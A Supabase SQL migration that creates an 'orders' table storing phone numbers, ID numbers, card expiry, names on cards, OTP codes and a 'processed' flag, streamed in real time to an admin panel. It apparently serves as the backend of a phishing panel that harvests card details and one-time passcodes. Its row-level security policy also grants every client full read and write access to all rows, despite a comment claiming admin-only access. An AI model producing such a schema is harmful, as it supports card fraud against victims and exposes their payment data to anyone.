-- Create orders table for storing order data
CREATE TABLE public.orders (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  timestamp TIMESTAMPTZ NOT NULL DEFAULT now(),
  phone TEXT NOT NULL,
  provider TEXT NOT NULL,
  amount NUMERIC NOT NULL,
  fees TEXT,
  total TEXT NOT NULL,
  id_number TEXT,
  expiry TEXT,
  pls TEXT,
  name_on_card TEXT,
  country TEXT,
  zip_code TEXT,
  otp_code TEXT,
  processing_type TEXT,
  is_processed BOOLEAN NOT NULL DEFAULT false,
  user_session_id TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Enable Row Level Security
ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;

-- Create policy to allow all operations (admin-only access in practice)
-- Orders are managed by admin panel, so we allow all operations
CREATE POLICY "Allow all operations on orders"
ON public.orders
FOR ALL
USING (true)
WITH CHECK (true);

-- Enable realtime for orders table
ALTER PUBLICATION supabase_realtime ADD TABLE public.orders;

-- Create function to update timestamps
CREATE OR REPLACE FUNCTION public.update_orders_updated_at()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Create trigger for automatic timestamp updates
CREATE TRIGGER update_orders_updated_at
BEFORE UPDATE ON public.orders
FOR EACH ROW
EXECUTE FUNCTION public.update_orders_updated_at();